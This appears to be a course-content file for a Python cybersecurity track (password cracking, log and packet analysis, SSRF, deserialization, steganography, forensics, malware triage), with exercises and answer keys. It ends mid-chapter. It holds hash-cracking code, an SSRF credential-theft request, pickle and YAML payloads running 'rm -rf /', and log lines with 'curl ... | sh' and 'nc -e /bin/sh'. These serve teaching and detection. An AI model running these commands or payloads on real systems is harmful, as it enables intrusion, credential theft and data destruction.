/* Cybersecurity track, chapters 17-32. */
(function (root) {
  'use strict';
  var L = (root.PyForgeContent = root.PyForgeContent || { python: [], cyber: [] });

  L.cyber.push(

  // ==========================================================================
  {
    id: 'cy17', title: 'Password Attacks', sub: 'wordlists, rules, hashing offline and cracking',
    teach: [
      { p: 'Once you have a password hash (from a breach, a database dump, a captured handshake), you crack it *offline* — no rate limits, just your hardware against the hash. Understanding this is what makes you take password storage seriously.' },
      { h: 'Dictionary attack' },
      { code: 'import hashlib\n\n# A leaked hash and a wordlist:\ntarget = hashlib.md5(b"sunshine").hexdigest()\nwordlist = ["password", "123456", "sunshine", "qwerty", "letmein"]\n\nfor word in wordlist:\n    if hashlib.md5(word.encode()).hexdigest() == target:\n        print("cracked:", word)\n        break\nelse:\n    print("not found")' },
      { h: 'Rule-based mutations (how real crackers extend a wordlist)' },
      { code: 'import hashlib\ntarget = hashlib.sha256(b"Summer2026!").hexdigest()\nbase_words = ["summer", "winter", "spring"]\n\ndef mutations(word):\n    yield word\n    yield word.capitalize()\n    for year in ("2025", "2026"):\n        yield word.capitalize() + year\n        yield word.capitalize() + year + "!"\n\nfor base in base_words:\n    for candidate in mutations(base):\n        if hashlib.sha256(candidate.encode()).hexdigest() == target:\n            print("cracked:", candidate)' },
      { p: 'Real tools (hashcat, John the Ripper) apply thousands of such rules at billions of guesses per second. The math of why a *slow, salted* hash defeats them is the whole point of chapter 3.' },
      { h: 'Why salting changes everything' },
      { code: 'import hashlib\n# Unsalted: one precomputed table cracks every user with that password.\n# Salted: each user needs a fresh attack.\npw = "hunter2"\nfor salt in ["a1b2", "c3d4"]:\n    h = hashlib.sha256((salt + pw).encode()).hexdigest()\n    print(salt, h[:16])   # same password, totally different hash' },
      { warn: 'This is a defensive skill. You crack hashes you are authorised to test — to prove weak passwords exist so they get changed. The same code, pointed at data you do not own, is a crime.' },
      { tip: 'The defensive takeaways: enforce length over complexity (a passphrase beats "P@ss1"), use argon2id, add per-user salts and a server-side pepper, and rate-limit + monitor online attempts.' }
    ],
    challenges: [
      { kind: 'code', prompt: 'Crack this MD5 hash against the wordlist and print the password.',
        starter: 'import hashlib\ntarget = hashlib.md5(b"letmein").hexdigest()\nwords = ["admin", "root", "letmein", "toor"]\n',
        expect: 'letmein',
        solution: 'import hashlib\ntarget = hashlib.md5(b"letmein").hexdigest()\nwords = ["admin", "root", "letmein", "toor"]\nfor w in words:\n    if hashlib.md5(w.encode()).hexdigest() == target:\n        print(w)\n        break' },
      { kind: 'code', prompt: 'Crack a salted SHA-256: the stored value is salt$hash. Find the password from the wordlist.',
        starter: 'import hashlib\nstored = "f00d$" + hashlib.sha256(b"f00ddragon").hexdigest()\nwords = ["cat", "dragon", "bird"]\n',
        expect: 'dragon',
        hint: 'The hash is sha256(salt + word).',
        solution: 'import hashlib\nstored = "f00d$" + hashlib.sha256(b"f00ddragon").hexdigest()\nsalt, h = stored.split("$")\nwords = ["cat", "dragon", "bird"]\nfor w in words:\n    if hashlib.sha256((salt + w).encode()).hexdigest() == h:\n        print(w)\n        break' },
      { kind: 'code', prompt: 'Apply mutations (base, Base, Base2026, Base2026!) to crack this hash. Print the password.',
        starter: 'import hashlib\ntarget = hashlib.sha256(b"Winter2026!").hexdigest()\nbases = ["summer", "winter"]\n',
        expect: 'Winter2026!',
        solution: 'import hashlib\ntarget = hashlib.sha256(b"Winter2026!").hexdigest()\nbases = ["summer", "winter"]\nfor b in bases:\n    for c in (b, b.capitalize(), b.capitalize()+"2026", b.capitalize()+"2026!"):\n        if hashlib.sha256(c.encode()).hexdigest() == target:\n            print(c)' },
      { kind: 'mc', prompt: 'Why is cracking done offline against the hash?',
        options: ['It is polite', 'No rate limits or lockouts apply — you try billions of guesses',
                  'It is encrypted online', 'The network is too slow'],
        answer: 1 },
      { kind: 'mc', prompt: 'What single measure most increases password strength against cracking?',
        options: ['Adding one symbol', 'Length (a long passphrase)', 'Changing it monthly', 'Using MD5'],
        answer: 1 }
    ]
  },

  // ==========================================================================
  {
    id: 'cy18', title: 'Log Analysis', sub: 'finding the attack in a million lines',
    teach: [
      { p: 'Logs are where incidents are discovered. The skill is turning noise into a signal: parse structure, aggregate, and threshold. This is the single most common day-to-day Python task in a SOC.' },
      { h: 'Parsing structured logs' },
      { code: 'import re\nfrom collections import Counter\n\nlog = """10.0.0.9 - - [05/Jan/2026:12:44:01] "POST /login" 401\n10.0.0.9 - - [05/Jan/2026:12:44:03] "POST /login" 401\n10.0.0.9 - - [05/Jan/2026:12:44:05] "POST /login" 401\n10.0.0.2 - - [05/Jan/2026:12:45:00] "GET /home" 200\n10.0.0.9 - - [05/Jan/2026:12:44:07] "POST /login" 200"""\n\npattern = re.compile(r\'(\\S+).*"(\\S+) (\\S+)" (\\d+)\')\nfor line in log.splitlines():\n    ip, method, path, status = pattern.match(line).groups()\n    print(ip, method, path, status)' },
      { h: 'Detecting brute force: threshold on failures' },
      { code: 'import re\nfrom collections import defaultdict\n\nlog = ["10.0.0.9 401", "10.0.0.9 401", "10.0.0.9 401",\n       "10.0.0.9 401", "10.0.0.9 200", "10.0.0.2 200"]\nfails = defaultdict(int)\nfor line in log:\n    ip, status = line.split()\n    if status == "401":\n        fails[ip] += 1\n\nfor ip, n in fails.items():\n    if n >= 4:\n        print(f"BRUTE FORCE {ip}: {n} failures")' },
      { h: 'The "many fails then a success" pattern — a likely compromise' },
      { code: 'events = [("10.0.0.9", 401), ("10.0.0.9", 401), ("10.0.0.9", 401),\n          ("10.0.0.9", 401), ("10.0.0.9", 200)]\nfails = 0\nfor ip, status in events:\n    if status == 401:\n        fails += 1\n    elif status == 200 and fails >= 3:\n        print(f"COMPROMISE: {ip} succeeded after {fails} failures")\n        fails = 0' },
      { h: 'Top-N and anomalies' },
      { code: 'from collections import Counter\nrequests_ = ["10.0.0.9"] * 500 + ["10.0.0.2"] * 3 + ["10.0.0.5"] * 4\ntop = Counter(requests_).most_common(1)[0]\nprint(f"loudest source {top[0]} made {top[1]} requests")' },
      { tip: 'The pipeline is always the same: **parse → aggregate → threshold → alert**. Once you internalise it, every new log format is just a new regex at the front.' }
    ],
    challenges: [
      { kind: 'code', prompt: 'Count failed logins (status 401) per IP and print the IP with the most, and its count, as `IP count`.',
        starter: 'log = ["10.0.0.9 401", "10.0.0.2 200", "10.0.0.9 401", "10.0.0.9 401", "10.0.0.5 401"]\n',
        expect: '10.0.0.9 3',
        solution: 'from collections import Counter\nlog = ["10.0.0.9 401", "10.0.0.2 200", "10.0.0.9 401", "10.0.0.9 401", "10.0.0.5 401"]\nfails = Counter(l.split()[0] for l in log if l.split()[1] == "401")\nip, n = fails.most_common(1)[0]\nprint(ip, n)' },
      { kind: 'code', prompt: 'Extract every IP from the Apache-style log and print the unique sorted list.',
        starter: 'import re\nlog = \'\'\'10.0.0.9 - - "GET /" 200\n192.168.1.5 - - "POST /x" 404\n10.0.0.9 - - "GET /a" 200\'\'\'\n',
        expect: "['10.0.0.9', '192.168.1.5']",
        solution: 'import re\nlog = \'\'\'10.0.0.9 - - "GET /" 200\n192.168.1.5 - - "POST /x" 404\n10.0.0.9 - - "GET /a" 200\'\'\'\nips = sorted(set(re.findall(r"^(\\d+\\.\\d+\\.\\d+\\.\\d+)", log, re.MULTILINE)))\nprint(ips)' },
      { kind: 'code', prompt: 'Detect the compromise: print the IP that had 3+ failures then a success.',
        starter: 'events = [("a", 401), ("a", 401), ("a", 401), ("a", 200), ("b", 200)]\n',
        expect: 'a',
        solution: 'events = [("a", 401), ("a", 401), ("a", 401), ("a", 200), ("b", 200)]\nfails = {}\nfor ip, st in events:\n    if st == 401:\n        fails[ip] = fails.get(ip, 0) + 1\n    elif st == 200 and fails.get(ip, 0) >= 3:\n        print(ip)\n        break' },
      { kind: 'mc', prompt: 'The universal log-analysis pipeline is:',
        options: ['encrypt, store, delete', 'parse, aggregate, threshold, alert',
                  'scan, exploit, report', 'read, print, exit'],
        answer: 1 },
      { kind: 'code', prompt: 'Find requests to suspicious paths: print each line whose path contains "../" or "<script".',
        starter: 'lines = [\'GET /home\', \'GET /download?f=../../etc/passwd\', \'GET /s?q=<script>\']\n',
        expect: 'GET /download?f=../../etc/passwd\nGET /s?q=<script>',
        solution: 'lines = [\'GET /home\', \'GET /download?f=../../etc/passwd\', \'GET /s?q=<script>\']\nfor l in lines:\n    if "../" in l or "<script" in l:\n        print(l)' }
    ]
  },

  // ==========================================================================
  {
    id: 'cy19', title: 'Packet Analysis', sub: 'reading traffic with scapy',
    teach: [
      { p: 'Packet capture (pcap) analysis reconstructs what actually crossed the wire. The sandbox ships a canned capture and a scapy-lite API so you can practise without a network card.' },
      { code: 'from scapy.all import sniff\n\npackets = sniff(count=10)\nfor pkt in packets[:3]:\n    print(pkt.summary())' },
      { h: 'Filtering and inspecting' },
      { code: 'from scapy.all import sniff\n\npackets = sniff()\ntcp = [p for p in packets if p.proto == "TCP"]\nprint("TCP packets:", len(tcp))\nfor p in packets:\n    if p.payload and "Authorization" in p.payload:\n        print("credentials in cleartext!")\n        print(p.payload[:60])' },
      { h: 'Detecting a port scan in the capture' },
      { code: 'from scapy.all import sniff\nfrom collections import defaultdict\n\npackets = sniff()\ntargets = defaultdict(set)\nfor p in packets:\n    if p.proto == "TCP" and p.flags == "S":     # lone SYNs\n        targets[p.src].add(p.dport)\n\nfor src, ports in targets.items():\n    if len(ports) >= 4:\n        print(f"PORT SCAN from {src}: {len(ports)} ports")' },
      { p: 'A host firing SYN packets at many different ports of one target, with no completed handshakes, is the fingerprint of a port scan. Counting distinct destination ports per source finds it.' },
      { h: 'Extracting cleartext secrets' },
      { code: 'from scapy.all import sniff\nimport base64\n\nfor p in sniff():\n    if "Authorization: Basic" in p.payload:\n        token = p.payload.split("Basic ")[1].split()[0]\n        print("decoded creds:", base64.b64decode(token).decode())' },
      { warn: 'This is why plaintext protocols (HTTP, FTP, Telnet) are dangerous on any shared network: anyone capturing traffic reads the credentials. It is the entire argument for HTTPS and SSH.' }
    ],
    challenges: [
      { kind: 'code', prompt: 'Sniff the capture and print how many packets use TCP.',
        expect: '8',
        solution: 'from scapy.all import sniff\nprint(sum(1 for p in sniff() if p.proto == "TCP"))' },
      { kind: 'code', prompt: 'Detect the port scan: print the source IP that hit 4 or more distinct destination ports with SYN packets.',
        expect: '10.10.0.66',
        solution: 'from scapy.all import sniff\nfrom collections import defaultdict\nt = defaultdict(set)\nfor p in sniff():\n    if p.proto == "TCP" and p.flags == "S":\n        t[p.src].add(p.dport)\nfor src, ports in t.items():\n    if len(ports) >= 4:\n        print(src)' },
      { kind: 'code', prompt: 'Find the packet carrying an Authorization header and print True if one exists.',
        expect: 'True',
        solution: 'from scapy.all import sniff\nprint(any("Authorization" in p.payload for p in sniff()))' },
      { kind: 'mc', prompt: 'A single host sending SYNs to many ports without completing handshakes indicates:',
        options: ['Normal browsing', 'A port scan', 'A DNS query', 'Encryption'],
        answer: 1 },
      { kind: 'mc', prompt: 'Why can captured HTTP Basic auth be trivially decoded?',
        options: ['It is encrypted weakly', 'It is only base64-encoded, not encrypted',
                  'It uses MD5', 'It cannot be'],
        answer: 1 }
    ]
  },

  // ==========================================================================
  {
    id: 'cy20', title: 'SSRF & Server-Side Attacks', sub: 'making the server fetch what you cannot',
    teach: [
      { p: 'Server-Side Request Forgery tricks a server into making requests on your behalf — reaching internal services, cloud metadata, and localhost that you could never touch directly.' },
      { h: 'The classic: cloud metadata theft' },
      { code: 'import requests\n# Imagine a "fetch this URL preview" feature that takes a user URL.\n# An attacker points it at the cloud metadata service (link-local, internal-only):\nr = requests.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/web")\nprint("AccessKeyId" in r.text)\nprint(r.json())' },
      { p: 'On real cloud instances, `169.254.169.254` hands out temporary credentials to anything that asks from the host. SSRF turns "the server fetches a URL for me" into "the server hands me its cloud keys". This exact bug caused the Capital One breach.' },
      { h: 'Reaching internal-only services' },
      { code: 'import requests\n# The intranet API is not exposed to the outside, but the server can reach it:\nr = requests.get("http://intranet.local/")\nprint(r.status_code, "reachable from server-side")' },
      { h: 'The fixes' },
      { list: [
        'Validate the URL against an **allow-list** of permitted hosts, not a block-list',
        'Resolve the hostname and reject private / link-local / loopback ranges',
        'Do it *after* DNS resolution (attackers use DNS rebinding to bypass name checks)',
        'Disable unused URL schemes (file://, gopher://) and follow no redirects blindly'
      ] },
      { code: 'import ipaddress, socket\ndef is_safe_target(host):\n    ip = ipaddress.ip_address(socket.gethostbyname(host))\n    return ip.is_global   # rejects private, loopback, link-local\n\nprint(is_safe_target("shop.local"))            # internal -> False\nprint("169.254.x is link-local:", ipaddress.ip_address("169.254.169.254").is_link_local)' },
      { tip: 'SSRF is powerful because it pivots. From one fetchable URL you can port-scan the internal network, hit admin panels bound to localhost, and read cloud metadata. Treat every server-side fetch of a user-supplied URL as dangerous.' }
    ],
    challenges: [
      { kind: 'code', prompt: 'Exploit SSRF: reach the metadata service and print True if you obtain a CTF flag from the IAM credentials.',
        expect: 'True',
        solution: 'import requests\nr = requests.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/web")\nprint("CTF{" in r.text)' },
      { kind: 'code', prompt: 'Print the AccessKeyId value from the metadata service.',
        expect: 'AKIA_SIMULATED',
        solution: 'import requests\nprint(requests.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/web").json()["AccessKeyId"])' },
      { kind: 'code', prompt: 'Implement the SSRF guard: print False for "169.254.169.254" and True for "8.8.8.8".',
        starter: 'import ipaddress\ndef safe(host):\n    return ipaddress.ip_address(host).is_global\nprint(safe("8.8.8.8"))\nprint(safe("169.254.169.254"))',
        expect: 'True\nFalse',
        solution: 'import ipaddress\ndef safe(host):\n    return ipaddress.ip_address(host).is_global\nprint(safe("8.8.8.8"))\nprint(safe("169.254.169.254"))' },
      { kind: 'mc', prompt: 'Why is an allow-list better than a block-list for SSRF defence?',
        options: ['It is shorter', 'Block-lists miss encodings, redirects, and rebinding; allow-lists permit only known-good',
                  'Allow-lists are faster', 'There is no difference'],
        answer: 1 },
      { kind: 'mc', prompt: 'The 169.254.169.254 address is dangerous in the cloud because it:',
        options: ['Is a public DNS server', 'Serves instance credentials to anything on the host',
                  'Is always down', 'Blocks SSRF'],
        answer: 1 }
    ]
  },

  // ==========================================================================
  {
    id: 'cy21', title: 'Deserialization & Injection Redux', sub: 'pickle, YAML, template and the "code from data" family',
    teach: [
      { p: 'A whole class of critical bugs comes from turning attacker-controlled *data* back into *code or objects*. The unifying insight from the injection chapters, taken to its most dangerous conclusion.' },
      { h: 'Pickle: never on untrusted data' },
      { code: 'import pickle\n\n# Pickling your own data is fine:\nsafe = pickle.dumps({"user": "alice", "role": "user"})\nprint(pickle.loads(safe))\n\n# But unpickling attacker bytes runs code. The sandbox refuses to,\n# and tells you why:\ntry:\n    pickle.loads(b"\\x80\\x04PYFORGE-PICKLE:os.system(\'rm -rf /\')")\nexcept RuntimeError as e:\n    print("blocked:", str(e)[:60])' },
      { p: 'A malicious pickle defines `__reduce__` to return `(os.system, ("command",))`, and `pickle.loads` obligingly executes it. There is no safe way to unpickle untrusted input — use JSON.' },
      { h: 'YAML: safe_load vs load' },
      { code: 'import yaml\n\ndata = yaml.safe_load("host: web01\\nport: 443\\nactive: true")\nprint(data, type(data["port"]).__name__)\n\n# The full loader can construct arbitrary Python objects from tags:\ntry:\n    yaml.load("!!python/object/apply:os.system [\'id\']")\nexcept RuntimeError as e:\n    print("blocked:", str(e)[:50])' },
      { warn: 'Always `yaml.safe_load`. Plain `yaml.load` (without a SafeLoader) is remote code execution waiting to happen — it has bitten major projects repeatedly.' },
      { h: 'The pattern across all of them' },
      { list: [
        'SQL injection — data becomes SQL',
        'Command injection — data becomes shell',
        'XSS — data becomes JavaScript',
        'Template injection — data becomes template code (SSTI)',
        'Insecure deserialization — data becomes objects/code',
        'Fix, every time: keep untrusted **data** out of the **code** channel'
      ] },
      { tip: 'When you review code, grep for the dangerous sinks: `eval`, `exec`, `pickle.loads`, `yaml.load`, `subprocess(..., shell=True)`, `os.system`, string-built SQL, and template rendering of user input. Trace where their argument comes from.' }
    ],
    challenges: [
      { kind: 'code', prompt: 'Safely serialize and restore a dict with pickle (your own data). Print the restored role.',
        starter: 'import pickle\nd = {"user": "amy", "role": "admin"}\n', expect: 'admin',
        solution: 'import pickle\nd = {"user": "amy", "role": "admin"}\nprint(pickle.loads(pickle.dumps(d))["role"])' },
      { kind: 'code', prompt: 'Parse this YAML safely and print the value of `port` as an int.',
        starter: 'import yaml\ntext = "host: db01\\nport: 5432"\n', expect: '5432',
        solution: 'import yaml\ntext = "host: db01\\nport: 5432"\nprint(yaml.safe_load(text)["port"])' },
      { kind: 'mc', prompt: 'Why is pickle.loads dangerous on untrusted input?',
        options: ['It is slow', 'It can execute arbitrary code during deserialization',
                  'It loses data', 'It needs a key'],
        answer: 1 },
      { kind: 'mc', prompt: 'The safe YAML loader function is:',
        options: ['yaml.load', 'yaml.safe_load', 'yaml.full_load', 'yaml.unsafe_load'],
        answer: 1 },
      { kind: 'mc', prompt: 'What unites SQLi, XSS, command injection and insecure deserialization?',
        options: ['They need HTTPS', 'Untrusted data crosses into a code/interpreter channel',
                  'They only affect Python', 'They are all client-side'],
        answer: 1 }
    ]
  },

  // ==========================================================================
  {
    id: 'cy22', title: 'Steganography & Data Hiding', sub: 'LSB, magic bytes, and finding hidden payloads',
    teach: [
      { p: 'Steganography hides data *inside* other data so its very existence is concealed. Attackers use it for exfiltration and C2; analysts must detect it.' },
      { h: 'Least-significant-bit hiding' },
      { p: 'Change the last bit of each byte (of a pixel channel, say) and the value shifts by at most 1 — invisible to the eye, but those bits spell out a hidden message.' },
      { code: 'def hide(cover, message):\n    bits = "".join(f"{b:08b}" for b in message.encode())\n    bits += "00000000"                      # null terminator\n    out = bytearray(cover)\n    for i, bit in enumerate(bits):\n        out[i] = (out[i] & 0xFE) | int(bit)  # replace the LSB\n    return bytes(out)\n\ndef reveal(stego):\n    bits = "".join(str(b & 1) for b in stego)\n    out = bytearray()\n    for i in range(0, len(bits) - 7, 8):\n        byte = int(bits[i:i+8], 2)\n        if byte == 0:\n            break\n        out.append(byte)\n    return out.decode(errors="replace")\n\ncover = bytes(range(200))\nstego = hide(cover, "SECRET")\nprint(reveal(stego))' },
      { h: 'Magic bytes: files hidden inside files' },
      { code: 'blob = b"harmless text\\x89PNG\\r\\n\\x1a\\n more data PK\\x03\\x04 zip here"\nsignatures = {b"\\x89PNG": "PNG image", b"PK\\x03\\x04": "ZIP archive",\n              b"\\xff\\xd8\\xff": "JPEG image", b"%PDF": "PDF document"}\nfor sig, name in signatures.items():\n    idx = blob.find(sig)\n    if idx >= 0:\n        print(f"found {name} at offset {idx}")' },
      { p: 'A JPEG with a ZIP concatenated after its end-of-image marker still opens as an image — and still unzips. Carving files out by their magic bytes is core forensics.' },
      { h: 'Detecting hidden data statistically' },
      { code: 'from collections import Counter\nimport math\ndef entropy(data):\n    counts = Counter(data)\n    total = len(data)\n    return -sum((c/total) * math.log2(c/total) for c in counts.values())\n\nprint(round(entropy(b"aaaaaaaa"), 2))          # low: predictable\nprint(round(entropy(bytes(range(256))), 2))     # high: near 8, random/encrypted' },
      { tip: 'High entropy (near 8 bits/byte) in something that should be plain text is a red flag: it usually means compressed, encrypted, or hidden data. Entropy analysis flags packed malware and hidden archives.' }
    ],
    challenges: [
      { kind: 'code', prompt: 'Reveal the LSB-hidden message from the stego bytes and print it.',
        starter: 'def hide(cover, msg):\n    bits = "".join(f"{b:08b}" for b in msg.encode()) + "00000000"\n    out = bytearray(cover)\n    for i, bit in enumerate(bits):\n        out[i] = (out[i] & 0xFE) | int(bit)\n    return bytes(out)\nstego = hide(bytes(range(150)), "PWN")\n',
        expect: 'PWN',
        solution: 'def reveal(s):\n    bits = "".join(str(b & 1) for b in s)\n    out = bytearray()\n    for i in range(0, len(bits) - 7, 8):\n        byte = int(bits[i:i+8], 2)\n        if byte == 0:\n            break\n        out.append(byte)\n    return out.decode()\ndef hide(cover, msg):\n    bits = "".join(f"{b:08b}" for b in msg.encode()) + "00000000"\n    out = bytearray(cover)\n    for i, bit in enumerate(bits):\n        out[i] = (out[i] & 0xFE) | int(bit)\n    return bytes(out)\nstego = hide(bytes(range(150)), "PWN")\nprint(reveal(stego))' },
      { kind: 'code', prompt: 'Find the offset of the hidden ZIP (PK\\x03\\x04) inside the blob and print it.',
        starter: 'blob = b"JFIF image data here PK\\x03\\x04 secret.zip"\n', expect: '21',
        solution: 'blob = b"JFIF image data here PK\\x03\\x04 secret.zip"\nprint(blob.find(b"PK\\x03\\x04"))' },
      { kind: 'code', prompt: 'Compute the entropy (rounded to 2 dp) of 256 distinct byte values.',
        expect: '8.0',
        solution: 'from collections import Counter\nimport math\ndata = bytes(range(256))\nc = Counter(data)\nt = len(data)\nprint(round(-sum((x/t) * math.log2(x/t) for x in c.values()), 2))' },
      { kind: 'mc', prompt: 'High entropy in a supposedly plaintext file suggests:',
        options: ['Nothing unusual', 'Compressed, encrypted, or hidden data',
                  'A syntax error', 'A large file'],
        answer: 1 },
      { kind: 'mc', prompt: 'How does LSB steganography stay invisible?',
        options: ['It encrypts everything', 'Flipping the lowest bit changes each value by at most 1',
                  'It deletes the original', 'It uses a password'],
        answer: 1 }
    ]
  },

  // ==========================================================================
  {
    id: 'cy23', title: 'Digital Forensics', sub: 'timelines, artifacts, and carving evidence',
    teach: [
      { p: 'Forensics reconstructs what happened after an incident: which files changed, when, and what an attacker touched. Python turns raw artifacts into a timeline.' },
      { h: 'Building a timeline from timestamps' },
      { code: 'from datetime import datetime\n\nevents = [\n    ("2026-01-05 12:44:07", "auth", "successful login admin from 10.10.0.66"),\n    ("2026-01-05 12:40:01", "auth", "failed login admin"),\n    ("2026-01-05 12:45:30", "file", "/etc/crontab modified"),\n    ("2026-01-05 12:44:50", "proc", "nc -e /bin/sh spawned"),\n]\n\nfor ts, source, msg in sorted(events):\n    print(f"{ts} [{source:>4}] {msg}")' },
      { p: 'Sorting by timestamp turns scattered logs into a story: failed logins, a success, a reverse shell, then persistence via crontab. That ordering *is* the investigation.' },
      { h: 'Hashing evidence for chain of custody' },
      { code: 'import hashlib\ndef evidence_hash(data):\n    return hashlib.sha256(data).hexdigest()\n\nimage = b"<disk image bytes>"\nprint("acquired:", evidence_hash(image))\n# Re-hash later to prove nothing changed:\nprint("verified:", evidence_hash(image) == evidence_hash(image))' },
      { warn: 'Integrity is the law here. You hash evidence at acquisition and re-verify it, so you can prove in court it was not altered. A single changed byte breaks the chain of custody.' },
      { h: 'Finding indicators of compromise' },
      { code: 'import re\nlog = """cron: /tmp/.hidden/backdoor.py\nbash: curl http://198.51.100.9/x | sh\nssh: new key added to authorized_keys"""\niocs = {\n    "suspicious paths": r"/tmp/\\.\\w+/",\n    "pipe to shell": r"\\|\\s*sh\\b",\n    "external download": r"https?://\\d+\\.\\d+\\.\\d+\\.\\d+",\n}\nfor name, pat in iocs.items():\n    if re.search(pat, log):\n        print("IOC:", name)' },
      { h: 'Recovering deleted-but-referenced data' },
      { code: '# File slack, journal entries and browser history often survive "deletion".\nartifacts = ["visited: bank.example (2026-01-04)",\n             "downloaded: invoice.pdf.exe",\n             "usb: SanDisk inserted 12:30"]\nfor a in artifacts:\n    print("artifact:", a)' },
      { tip: 'The forensic mindset: everything leaves a trace, timestamps tie traces together, and integrity must be provable. Python is the glue that assembles thousands of artifacts into one defensible timeline.' }
    ],
    challenges: [
      { kind: 'code', prompt: 'Sort the events chronologically and print the message of the earliest one.',
        starter: 'events = [("12:44", "login"), ("12:40", "recon"), ("12:50", "exfil")]\n',
        expect: 'recon',
        solution: 'events = [("12:44", "login"), ("12:40", "recon"), ("12:50", "exfil")]\nprint(sorted(events)[0][1])' },
      { kind: 'code', prompt: 'Verify evidence integrity: print MATCH if the two acquisitions hash equal.',
        starter: 'import hashlib\na = b"disk-image-v1"\nb = b"disk-image-v1"\n', expect: 'MATCH',
        solution: 'import hashlib\na = b"disk-image-v1"\nb = b"disk-image-v1"\nprint("MATCH" if hashlib.sha256(a).digest() == hashlib.sha256(b).digest() else "DIFFER")' },
      { kind: 'code', prompt: 'Scan the log for IOCs: print each line that contains a pipe-to-shell (`| sh`) or a hidden /tmp path.',
        starter: 'lines = ["ok boot", "curl x | sh", "run /tmp/.evil/x", "normal"]\n',
        expect: 'curl x | sh\nrun /tmp/.evil/x',
        solution: 'import re\nlines = ["ok boot", "curl x | sh", "run /tmp/.evil/x", "normal"]\nfor l in lines:\n    if re.search(r"\\|\\s*sh\\b", l) or re.search(r"/tmp/\\.", l):\n        print(l)' },
      { kind: 'mc', prompt: 'Why hash evidence at acquisition?',
        options: ['To compress it', 'To prove later it was not altered (chain of custody)',
                  'To encrypt it', 'To index it'],
        answer: 1 },
      { kind: 'mc', prompt: 'What turns scattered logs into an investigation?',
        options: ['Deleting duplicates', 'Ordering events by timestamp into a timeline',
                  'Encrypting them', 'Counting lines'],
        answer: 1 }
    ]
  },

  // ==========================================================================
  {
    id: 'cy24', title: 'Malware Analysis Basics', sub: 'static triage, strings, IOCs and safe handling',
    teach: [
      { warn: 'Real malware is analysed only in isolated VMs, offline, with snapshots. Here you analyse **benign simulated samples** — the techniques are real, the danger is not. Never run unknown binaries on your own machine.' },
      { h: 'Static analysis: learn without executing' },
      { code: 'import re\n\nsample = b"""MZ\\x90\\x00 this program cannot be run in DOS mode\nhttp://198.51.100.44/gate.php\nHKEY_CURRENT_USER\\\\Run\\\\updater\ncmd.exe /c schtasks /create\nCreateRemoteThread VirtualAllocEx"""\n\n# Extract printable strings, like the `strings` tool:\nstrings = re.findall(rb"[\\x20-\\x7e]{5,}", sample)\nfor s in strings[:6]:\n    print(s.decode())' },
      { h: 'Pulling IOCs out of the strings' },
      { code: 'import re\nsample = b"beacon to http://198.51.100.44/gate.php every 60s, drop C:\\\\Temp\\\\x.exe"\nurls = re.findall(rb"https?://[\\w./]+", sample)\nips = re.findall(rb"\\d+\\.\\d+\\.\\d+\\.\\d+", sample)\nprint("C2 URLs:", [u.decode() for u in urls])\nprint("IPs:", [i.decode() for i in ips])' },
      { h: 'Recognising capability from API imports' },
      { code: 'imports = ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread",\n           "InternetOpenUrl", "RegSetValueEx", "CryptEncrypt"]\nsignatures = {\n    "process injection": {"VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"},\n    "network / C2": {"InternetOpenUrl"},\n    "persistence": {"RegSetValueEx"},\n    "ransomware-like": {"CryptEncrypt"},\n}\nimp = set(imports)\nfor behaviour, needed in signatures.items():\n    if needed & imp:\n        print("capability:", behaviour)' },
      { p: 'This trio — `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread` — is the textbook process-injection pattern. Reading imports tells you what a sample *can* do before you ever run it.' },
      { h: 'Hashing for threat-intel lookup' },
      { code: 'import hashlib\nsample = b"malware-bytes-here"\nprint("md5:", hashlib.md5(sample).hexdigest())\nprint("sha256:", hashlib.sha256(sample).hexdigest())\n# You would look these up in VirusTotal / a threat-intel feed.' },
      { tip: 'Triage order: hash it (known?), extract strings and IOCs (what does it talk to?), read imports (what can it do?), check entropy (packed?). Only then, if needed, detonate it in a sandbox.' }
    ],
    challenges: [
      { kind: 'code', prompt: 'Extract printable strings of length >= 5 from the sample and print how many there are.',
        starter: 'import re\nsample = b"MZ\\x00\\x01hello\\x00\\x02world\\x00attack"\n', expect: '3',
        solution: 'import re\nsample = b"MZ\\x00\\x01hello\\x00\\x02world\\x00attack"\nprint(len(re.findall(rb"[\\x20-\\x7e]{5,}", sample)))' },
      { kind: 'code', prompt: 'Pull the C2 URL out of the sample strings and print it.',
        starter: 'sample = b"beacon http://evil.example/gate.php interval 30"\n',
        expect: 'http://evil.example/gate.php',
        solution: 'import re\nsample = b"beacon http://evil.example/gate.php interval 30"\nprint(re.search(rb"https?://[\\w./]+", sample).group().decode())' },
      { kind: 'code', prompt: 'Classify the sample: print `process injection` if it imports all three of VirtualAllocEx, WriteProcessMemory, CreateRemoteThread.',
        starter: 'imports = ["LoadLibrary", "VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"]\n',
        expect: 'process injection',
        solution: 'imports = ["LoadLibrary", "VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"]\nneeded = {"VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"}\nif needed <= set(imports):\n    print("process injection")' },
      { kind: 'mc', prompt: 'Why do static analysis before running a sample?',
        options: ['It is faster to type', 'You learn its capabilities and IOCs without the risk of execution',
                  'It is required by law', 'Dynamic analysis is impossible'],
        answer: 1 },
      { kind: 'mc', prompt: 'The safe place to detonate real malware is:',
        options: ['Your laptop', 'An isolated, snapshotted VM with no sensitive network access',
                  'A colleague\'s machine', 'Production'],
        answer: 1 }
    ]
  },

  // ==========================================================================
  {
    id: 'cy25', title: 'OSINT & Recon Automation', sub: 'turning public data into a target picture',
    teach: [
      { p: 'Open-Source Intelligence gathers what is already public — subdomains, emails, tech stacks, leaked credentials — to map an organisation\'s footprint before (authorised) testing. Automation makes it thorough.' },
      { h: 'Generating and checking candidates' },
      { code: 'import requests\n\ncompany = "shop.local"\ncandidates = ["www", "mail", "intranet", "vpn", "dev", "admin"]\nfor sub in candidates:\n    host = f"{sub}.{company}" if sub != "www" else company\n    try:\n        r = requests.get(f"http://{host}/", timeout=2)\n        print(f"{host:<20} alive ({r.status_code})")\n    except Exception:\n        pass' },
      { h: 'Harvesting emails and usernames' },
